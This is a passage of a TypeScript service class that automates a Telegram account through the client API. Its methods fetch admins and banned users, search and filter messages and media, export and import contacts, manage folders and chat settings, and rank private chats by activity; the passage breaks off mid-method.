            manageCall: boolean;
        };
    }>> {
        if (!this.client) throw new Error('Client not initialized');

        const result = await this.client.invoke(new Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: bigInt(0)
        }));

        if ('users' in result) {
            const participants = result.participants as Api.ChannelParticipantAdmin[];
            const users = result.users;

            return participants.map(participant => {
                const adminRights = participant.adminRights as Api.ChatAdminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }

    async getGroupBannedUsers(groupId: string): Promise<Array<{
        userId: string;
        bannedRights: {
            viewMessages: boolean;
            sendMessages: boolean;
            sendMedia: boolean;
            sendStickers: boolean;
            sendGifs: boolean;
            sendGames: boolean;
            sendInline: boolean;
            embedLinks: boolean;
            untilDate: number;
        };
    }>> {
        if (!this.client) throw new Error('Client not initialized');

        const result = await this.client.invoke(new Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: bigInt(0)
        }));

        if ('users' in result) {
            const participants = result.participants as Api.ChannelParticipantBanned[];

            return participants.map(participant => {
                const bannedRights = participant.bannedRights as Api.ChatBannedRights;
                return {
                    userId: (participant.peer as Api.PeerChat).chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }

    async searchMessages(params: SearchMessagesDto): Promise<SearchMessagesResponseDto> {
        if (!this.client) throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 },
            roundVoice: { messages: [], total: 0 },
        }
        const { chatId, query = '', types, maxId, minId, limit } = params;
        this.logger.info(this.phoneNumber, "Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };

            this.logger.info(this.phoneNumber, type, queryFilter);
            const searchQuery = {
                q: query,
                filter: filter,
                ...queryFilter,
                hash: bigInt(0),
            }
            let messages = [];
            let count = 0;
            this.logger.info(this.phoneNumber, "Search Query: ", searchQuery);
            if (chatId) {
                searchQuery['peer'] = await this.safeGetEntity(chatId);
                this.logger.info(this.phoneNumber, "Performing search in chat: ", chatId);
                const result = await this.client.invoke(
                    new Api.messages.Search(searchQuery)
                );

                if (!('messages' in result)) {
                    return {};
                }
                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                count = result["count"] || 0;
                messages = result.messages as Api.Message[];
            } else {
                this.logger.info(this.phoneNumber, "Performing global search");
                const result = await this.client.invoke(
                    new Api.messages.SearchGlobal({
                        ...searchQuery,
                        offsetRate: 0,
                        offsetPeer: new Api.InputPeerEmpty(),
                        offsetId: 0,
                        usersOnly: true
                    })
                );
                if (!('messages' in result)) {
                    return {};
                }
                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                count = result["count"] || 0;
                messages = result.messages as Api.Message[];
            }
            if (types.includes(MessageMediaType.TEXT) && types.length === 1) {
                this.logger.info(this.phoneNumber, "Text Filter");
                messages = messages.filter((msg: Api.Message) => !('media' in msg));
            }
            const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {
                const unwantedTexts = [
                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
                ]
                if (message.media && message.media instanceof Api.MessageMediaDocument) {
                    const document = message.media.document as Api.Document;
                    const fileNameAttr = document.attributes.find(attr => attr instanceof Api.DocumentAttributeFilename);
                    const fileName = fileNameAttr && fileNameAttr instanceof Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';
                    const fileNameText = fileName.toLowerCase();
                    const isWantedFile = !contains(fileNameText, unwantedTexts);
                    return isWantedFile ? message.id : null;
                } else {
                    const messageText = (message.text || '').toLowerCase();
                    const containsFilteredContent = contains(messageText, unwantedTexts);
                    return !containsFilteredContent ? message.id : null;
                }
            }));

            const filteredMessages = processedMessages.filter(id => id !== null);
            const localResult = {
                messages: filteredMessages,
                total: count ? count : filteredMessages.length
            }
            finalResult[`${type}`] = localResult;
        }
        return finalResult
    }

    async getAllMediaMetaData(params: {
        chatId: string;
        types?: ('photo' | 'video' | 'document' | 'voice' | 'all')[];
        startDate?: Date;
        endDate?: Date;
        maxId?: number;
        minId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');
        let { chatId, types = ['all'], startDate, endDate, maxId, minId } = params;

        // If "all" is in types, expand to all types
        const hasAll = types.includes('all');
        const typesToFetch: ('photo' | 'video' | 'document' | 'voice')[] = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all') as ('photo' | 'video' | 'document' | 'voice')[];
        let allMedia: any[] = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;

        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types: hasAll ? ['all'] : typesToFetch,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId > 0 ? lastOffsetId : undefined,
                minId
            });
            this.logger.info(this.phoneNumber, `hasMore: ${response.pagination.hasMore}, Total: ${response.pagination.total}, nextMaxId: ${response.pagination.nextMaxId}`);

            // Extract items based on response format
            if (response.groups) {
                // Flatten all groups
                const items = response.groups.flatMap(group => group.items || []);
                allMedia = allMedia.concat(items);
            } else if (response.data) {
                allMedia = allMedia.concat(response.data);
            }

            if (!response.pagination.hasMore || !response.pagination.nextMaxId) {
                hasMore = false;
                this.logger.info(this.phoneNumber, 'No more messages to fetch');
            } else {
                lastOffsetId = response.pagination.nextMaxId;
                this.logger.info(this.phoneNumber, `Fetched ${allMedia.length} messages so far`);
            }
            await sleep(3000);
        }

        // Group by type if "all" was requested
        if (hasAll) {
            const grouped = allMedia.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {} as Record<string, typeof allMedia>);

            const groups = typesToFetch.map(mediaType => ({
                type: mediaType,
                count: grouped[mediaType]?.length || 0,
                items: grouped[mediaType] || [],
                pagination: {
                    page: 1,
                    limit: grouped[mediaType]?.length || 0,
                    total: grouped[mediaType]?.length || 0,
                    totalPages: 1,
                    hasMore: false
                }
            }));

            return {
                groups,
                pagination: {
                    page: 1,
                    limit: allMedia.length,
                    total: allMedia.length,
                    totalPages: 1,
                    hasMore: false
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        } else {
            return {
                data: allMedia,
                pagination: {
                    page: 1,
                    limit: allMedia.length,
                    total: allMedia.length,
                    totalPages: 1,
                    hasMore: false
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }

    async getFilteredMedia(params: {
        chatId: string;
        types?: ('photo' | 'video' | 'document' | 'voice' | 'all')[];
        startDate?: Date;
        endDate?: Date;
        limit?: number;
        maxId?: number;
        minId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        let {
            chatId,
            types = ['photo', 'video', 'document'],
            startDate,
            endDate,
            limit = 50,
            maxId,
            minId
        } = params;

        // If "all" is in types, expand to all types and mark for grouping
        const hasAll = types.includes('all');
        const typesToFetch: ('photo' | 'video' | 'document' | 'voice')[] = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all') as ('photo' | 'video' | 'document' | 'voice')[];

        // When "all" is requested, fetch more messages to ensure we have enough for each type
        const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);

        const query: Partial<IterMessagesParams> = {
            limit: queryLimit,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {
                minDate: Math.floor(startDate.getTime() / 1000)
            }),
            ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {
                maxDate: Math.floor(endDate.getTime() / 1000)
            })
        };

        const ent = await this.safeGetEntity(chatId);
        this.logger.info(this.phoneNumber, "getFilteredMedia", params);
        const messages = await this.client.getMessages(ent, query);
        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);

        const filteredMessages = messages.filter(message => {
            if (!message.media) return false;
            const mediaType = this.getMediaType(message.media);
            return typesToFetch.includes(mediaType);
        });

        this.logger.info(this.phoneNumber, `Filtered down to ${filteredMessages.length} messages`);

        // Process thumbnails with controlled concurrency to respect rate limits
        const mediaData = await this.processWithConcurrencyLimit(
            filteredMessages,
            async (message: Api.Message) => {
                const thumbBuffer = await this.getThumbnailBuffer(message);

                const mediaDetails = this.getMediaDetails(message.media as Api.MessageMediaDocument);

                // Extract additional metadata
                let fileSize: number | undefined;
                let mimeType: string | undefined;
                let filename: string | undefined;
                let width: number | undefined;
                let height: number | undefined;
                let duration: number | undefined;

                if (message.media instanceof Api.MessageMediaPhoto) {
                    const photo = message.photo as Api.Photo;
                    mimeType = 'image/jpeg'; // Default for photos
                    filename = 'photo.jpg'; // Default filename

                    if (photo?.sizes && photo.sizes.length > 0) {
                        const largestSize = photo.sizes[photo.sizes.length - 1];
                        if (largestSize && 'size' in largestSize) {
                            fileSize = (largestSize as any).size;
                        }
                        // Extract width and height from photo sizes
                        if (largestSize && 'w' in largestSize) {
                            width = (largestSize as any).w;
                        }
                        if (largestSize && 'h' in largestSize) {
                            height = (largestSize as any).h;
                        }
                    }
                } else if (message.media instanceof Api.MessageMediaDocument) {
                    const doc = message.media.document;
                    if (doc instanceof Api.Document) {
                        fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);
                        mimeType = doc.mimeType;

                        const fileNameAttr = doc.attributes?.find(
                            attr => attr instanceof Api.DocumentAttributeFilename
                        ) as Api.DocumentAttributeFilename;
                        filename = fileNameAttr?.fileName;

                        const videoAttr = doc.attributes?.find(
                            attr => attr instanceof Api.DocumentAttributeVideo
                        ) as Api.DocumentAttributeVideo;
                        if (videoAttr) {
                            width = videoAttr.w;
                            height = videoAttr.h;
                            duration = videoAttr.duration;
                        }

                        const audioAttr = doc.attributes?.find(
                            attr => attr instanceof Api.DocumentAttributeAudio
                        ) as Api.DocumentAttributeAudio;
                        if (audioAttr && !duration) {
                            duration = audioAttr.duration;
                        }
                    }
                }

                // Handle date - can be Date object or number (Unix timestamp)
                let dateValue: number;
                const msgDate = message.date;
                if (msgDate) {
                    if (typeof msgDate === 'number') {
                        dateValue = msgDate;
                    } else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {
                        const dateObj = msgDate as { getTime: () => number };
                        dateValue = Math.floor(dateObj.getTime() / 1000);
                    } else {
                        dateValue = Math.floor(Date.now() / 1000);
                    }
                } else {
                    dateValue = Math.floor(Date.now() / 1000);
                }

                return {
                    messageId: message.id,
                    chatId: chatId,
                    type: this.getMediaType(message.media),
                    date: dateValue,
                    caption: message.message || '',
                    thumbnail: thumbBuffer ? `data:image/jpeg;base64,${thumbBuffer.toString('base64')}` : undefined,
                    fileSize,
                    mimeType,
                    filename,
                    width,
                    height,
                    duration,
                    mediaDetails: mediaDetails || undefined
                };
            },
            this.THUMBNAIL_CONCURRENCY_LIMIT,
            this.THUMBNAIL_BATCH_DELAY_MS
        );

        // Group by type if "all" was requested
        if (hasAll) {
            const grouped = mediaData.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {} as Record<string, typeof mediaData>);

            // Create groups with pagination for each type
            const groups = typesToFetch.map(mediaType => {
                const items = (grouped[mediaType] || []).slice(0, limit);
                const typeTotal = items.length;
                const typeHasMore = grouped[mediaType]?.length > limit;
                const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;
                const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;
                const typeNextMaxId = typeHasMore ? typeLastMessageId : undefined;

                return {
                    type: mediaType,
                    count: typeTotal,
                    items: items,
                    pagination: {
                        page: 1,
                        limit,
                        total: typeTotal,
                        totalPages: typeHasMore ? -1 : 1,
                        hasMore: typeHasMore,
                        nextMaxId: typeNextMaxId,
                        firstMessageId: typeFirstMessageId,
                        lastMessageId: typeLastMessageId
                    }
                };
            });

            // Overall pagination (based on all messages fetched)
            const totalItems = mediaData.length;
            const overallHasMore = messages.length === queryLimit && messages.length > 0;
            const overallFirstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;
            const overallLastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;
            const overallNextMaxId = overallHasMore ? overallLastMessageId : undefined;
            const overallPrevMaxId = maxId && mediaData.length > 0 ? overallFirstMessageId : undefined;

            return {
                groups,
                pagination: {
                    page: 1,
                    limit,
                    total: totalItems,
                    totalPages: overallHasMore ? -1 : 1,
                    hasMore: overallHasMore,
                    nextMaxId: overallNextMaxId,
                    prevMaxId: overallPrevMaxId,
                    firstMessageId: overallFirstMessageId,
                    lastMessageId: overallLastMessageId
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        } else {
            // Single or multiple types without grouping - return as array
            const total = mediaData.length;
            const hasMore = messages.length === queryLimit && messages.length > 0;
            const firstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;
            const lastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;
            const nextMaxId = hasMore ? lastMessageId : undefined;
            const prevMaxId = maxId && mediaData.length > 0 ? firstMessageId : undefined;

            return {
                data: mediaData,
                pagination: {
                    page: 1,
                    limit,
                    total,
                    totalPages: hasMore ? -1 : 1,
                    hasMore,
                    nextMaxId,
                    prevMaxId,
                    firstMessageId,
                    lastMessageId
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }

    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {
        if (!this.client) throw new Error('Client not initialized');

        try {
            return await this.client.getEntity(entityId);
        } catch (error) {
            this.logger.info(this.phoneNumber, `Failed to get entity directly for ${entityId}, searching in dialogs...`);

            try {
                // Use iterDialogs for memory-efficient iteration
                for await (const dialog of this.client.iterDialogs({})) {
                    const entity = dialog.entity;
                    const dialogId = entity.id.toString();

                    // Check exact match
                    if (dialogId === entityId.toString()) {
                        return entity;
                    }

                    // Also check with/without -100 prefix for flexible matching
                    if (dialogId.startsWith('-100')) {
                        if (dialogId.substring(4) === entityId.toString()) {
                            return entity;
                        }
                    } else {
                        if (`-100${dialogId}` === entityId.toString()) {
                            return entity;
                        }
                    }
                }

                this.logger.info(this.phoneNumber, `Entity ${entityId} not found in dialogs either`);
                return null;
            } catch (dialogError) {
                this.logger.error(this.phoneNumber, 'Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }

    // Contact Management Features
    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));

        return [header, ...rows].join('\n');
    }

    private generateVCard(contacts: any[]) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }

    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {
        if (!this.client) throw new Error('Client not initialized');

        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];

        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }

        if (format === 'csv') {
            const csvData = contacts.map((contact: any) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>
                    p.id.toString() === contact.id.toString()
                ) : false
            }));
            return this.generateCSV(csvData);
        } else {
            return this.generateVCard(contacts);
        }
    }

    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {
        if (!this.client) throw new Error('Client not initialized');

        const results = await Promise.all(data.map(async contact => {
            try {
                await this.client.invoke(new Api.contacts.ImportContacts({
                    contacts: [new Api.InputPhoneContact({
                        clientId: bigInt(Math.floor(Math.random() * 1000000)),
                        phone: contact.phone,
                        firstName: contact.firstName,
                        lastName: contact.lastName || ''
                    })]
                }));
                return { success: true, phone: contact.phone };
            } catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));

        return results;
    }

    async manageBlockList(userIds: string[], block: boolean) {
        if (!this.client) throw new Error('Client not initialized');

        const results = await Promise.all(userIds.map(async userId => {
            try {
                if (block) {
                    await this.client.invoke(new Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                } else {
                    await this.client.invoke(new Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            } catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));

        return results;
    }

    async getContactStatistics() {
        if (!this.client) throw new Error('Client not initialized');

        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];

        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);

        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c: any) => c.phone).length,
            mutual: contacts.filter((c: any) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c: any) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }

    // Chat Folder Management
    async createChatFolder(options: {
        name: string,
        includedChats: string[],
        excludedChats?: string[],
        includeContacts?: boolean,
        includeNonContacts?: boolean,
        includeGroups?: boolean,
        includeBroadcasts?: boolean,
        includeBots?: boolean,
        excludeMuted?: boolean,
        excludeRead?: boolean,
        excludeArchived?: boolean
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const folder = new Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: new Api.TextWithEntities({
                text: options.name,
                entities: []
            }),
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });

        await this.client.invoke(new Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));

        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }

    async getChatFolders() {
        if (!this.client) throw new Error('Client not initialized');

        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());
        // DialogFilters object has a 'filters' property which is an array
        return (filters.filters || []).map((filter: any) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }

    async sendMediaBatch(options: {
        chatId: string;
        media: Array<{
            type: 'photo' | 'video' | 'document';
            url: string;
            caption?: string;
            fileName?: string;
        }>;
        silent?: boolean;
        scheduleDate?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const mediaFiles = await Promise.all(
            options.media.map(async (item) => {
                const buffer = await this.downloadFileFromUrl(item.url);
                const file = new CustomFile(
                    item.fileName || `media.${this.getMediaExtension(item.type)}`,
                    buffer.length,
                    'media',
                    buffer
                );

                const uploadedFile = await this.client.uploadFile({
                    file,
                    workers: 1
                });

                const inputMedia = item.type === 'photo' ?
                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                    new Api.InputMediaUploadedDocument({
                        file: uploadedFile,
                        mimeType: this.getMimeType(item.type),
                        attributes: this.getMediaAttributes(item)
                    });

                return new Api.InputSingleMedia({
                    media: inputMedia,
                    message: item.caption || '',
                    entities: []
                });
            })
        );

        return this.client.invoke(new Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }

    private getMimeType(type: string): string {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }

    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {
        const attributes: Api.TypeDocumentAttribute[] = [];

        if (item.fileName) {
            attributes.push(new Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }

        if (item.type === 'video') {
            attributes.push(new Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }

        return attributes;
    }

    async editMessage(options: {
        chatId: string;
        messageId: number;
        text?: string;
        media?: {
            type: 'photo' | 'video' | 'document';
            url: string;
        };
    }) {
        if (!this.client) throw new Error('Client not initialized');

        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new CustomFile(
                `media.${this.getMediaExtension(options.media.type)}`,
                buffer.length,
                'media',
                buffer
            );

            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });

            const inputMedia = options.media.type === 'photo' ?
                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });

            return this.client.invoke(new Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }

        if (options.text) {
            return this.client.invoke(new Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }

        throw new Error('Either text or media must be provided');
    }

    async getChats(options: {
        limit?: number;
        offsetDate?: number;
        offsetId?: number;
        offsetPeer?: string;
        folderId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const dialogs: any[] = [];
        const limit = options.limit || 100;
        let count = 0;

        // Use iterDialogs for memory-efficient iteration
        for await (const dialog of this.client.iterDialogs({
            ...options,
            limit
        })) {
            dialogs.push(dialog);
            count++;
            if (count >= limit) break;
        }

        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof Api.User ? 'user' :
                    entity instanceof Api.Chat ? 'group' :
                        entity instanceof Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }

    async updateChatSettings(settings: {
        chatId: string;
        username?: string;
        title?: string;
        about?: string;
        photo?: string;
        slowMode?: number;
        linkedChat?: string;
        defaultSendAs?: string;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const chat = await this.client.getEntity(settings.chatId);

        const updates: Promise<any>[] = [];

        if (settings.title) {
            updates.push(this.client.invoke(new Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }

        if (settings.about) {
            updates.push(this.client.invoke(new Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }

        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });

            updates.push(this.client.invoke(new Api.channels.EditPhoto({
                channel: chat,
                photo: new Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }

        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }

        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }

        if (settings.username) {
            updates.push(this.client.invoke(new Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }

        await Promise.all(updates);
        return true;
    }

    async getMessageStats(options: {
        chatId: string;
        period: 'day' | 'week' | 'month';
        fromDate?: Date;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const now = options.fromDate || new Date();
        const startDate = new Date(now);

        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }

        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });

        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };

        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;

            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            } else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }

            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }

        return stats;
    }

    /**
     * Get top private chats with smarter filtering based on user activity patterns
     * Uses time-decay scoring, dialog metadata, conversation patterns, and adaptive filtering
     * for more accurate results based on actual user engagement with peers
     * @returns Array of top private chats sorted by engagement score
     */
    async getTopPrivateChats(limit: number = 10): Promise<Array<{
        chatId: string;
        username?: string;
        firstName?: string;
        lastName?: string;
        totalMessages: number;
        interactionScore: number;
        engagementLevel: 'recent' | 'active' | 'dormant';
        lastActivityDays: number;
        calls: {
            total: number;
            incoming: {
                total: number;
                audio: number;
                video: number;
            };
            outgoing: {
                total: number;
                audio: number;
                video: number;
            };
        };
        media: {
            photos: number;
            videos: number;
            photosByUs: number;
            photosByThem: number;
            videosByUs: number;
            videosByThem: number;
        };
        activityBreakdown: {
            videoCalls: number;
            audioCalls: number;
            mediaSharing: number;
            textMessages: number;
        };
    }>> {
        if (!this.client) throw new Error('Client not initialized');

        const clampedLimit = Math.max(1, Math.min(50, limit || 10));
        this.logger.info(this.phoneNumber, `Starting optimized getTopPrivateChats analysis with limit=${clampedLimit}...`);

        const startTime = Date.now();
        const now = Date.now();
        const nowSeconds = Math.floor(now / 1000);

        const weights = {
            videoCall: 2,
            incomingCall: 4,
            outgoingCall: 1,
            sharedVideo: 12,
            sharedPhoto: 10,
            textMessage: 1,
            unreadMessages: 1,
        };

        const ACTIVITY_WINDOWS = {
            recent: 7,
            active: 30,
            dormant: 90
        };

        // 1. Parallel initial fetches for speed
        this.logger.info(this.phoneNumber, 'Fetching initial metadata in parallel...');
        const [me, callLogs, dialogs] = await Promise.all([
